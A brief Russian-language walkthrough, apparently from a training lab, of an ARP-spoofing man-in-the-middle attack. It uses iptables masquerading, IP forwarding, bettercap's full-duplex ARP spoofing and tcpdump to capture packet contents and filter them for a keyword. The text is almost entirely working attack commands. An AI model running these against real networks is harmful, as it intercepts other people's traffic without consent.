 Для начала настроим masquerade:

```bash
sudo iptables -t nat -A POSTROUTING -o ethX -j MASQUERADE
```

и убедимся, что включен ipv4 forwarding:

```bash
sudo sysctl -w net.ipv4.ip_forward=1
```
запускаем
```
bettercap eth0
```
настраиваем для атаки на цели и шлюз
```
set arp.spoof.fullduplex true
``` 
запускаем 
```
arp.spoof on 
```
и он должен определить все машины в сети (endpoint)
Затем запускаем 
``` 
tcpdump -i eth0 -A | grep "cybered"
```
 где -A выводит содержимое пакетов и с помощью grep уберем лишние данные